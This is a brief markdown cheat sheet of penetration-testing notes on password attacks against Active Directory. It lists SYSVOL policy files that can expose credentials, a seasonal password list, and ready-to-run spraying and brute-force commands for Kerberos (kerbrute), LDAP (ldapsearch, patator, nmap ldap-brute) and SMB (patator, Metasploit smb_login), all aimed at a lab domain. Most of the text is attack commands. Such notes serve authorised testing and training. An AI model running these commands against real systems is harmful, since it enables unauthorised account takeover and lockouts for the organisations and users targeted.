# Password Attacks

**Summery:**

- [Password policy](#password-policy)
- [Password Attack (Spraying)](#password-attack-spraying)
  - [Kerberos](#kerberos)
  - [LDAP](#ldap)
  - [SMB](#smb)

## Password policy

Default SMB share:

    \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
File:

- groups.xml
- scheduledtasks.xml
- Services.xml

## Password Attack (Spraying)

Password List :

- Spring19
- Summer19
- Winter19
- Autunm19

### Kerberos

    cd /usr/share/kerbrute

    kerbrute passwordspray /usr/share/seclist/Usernames/cirt-default-usernames.txt -d pentest.lab --dc 192.168.1.81 Summer19

### LDAP

> Get LDAP info

    ldapsearch -H ldap://192.168.1.81/ -x -LLL -b "CN=bob,CN=Users,DC=pentest,DC=lab"
> Patator

    patator ldap_login host=192.168.1.81 binddn="CN=FILE0,CN=Users,DC=pentest,DC=lab" bindpw='Summer19' 0=/usr/share/seclist/Usernames/cirt-default-usernames.txt

> Nmap

    nmap -p 389 --script ldap-brute --script-args ldap.base='"CN=Users,DC=pentest,DC=lab"' 192.168.1.81

### SMB

> patators

    patator smb_login host=192.168.1.81 user=FILE0 0=test.lst password=Spring19

> msfconsole

    msf > use auxiliary/scanner/smb/smb_login
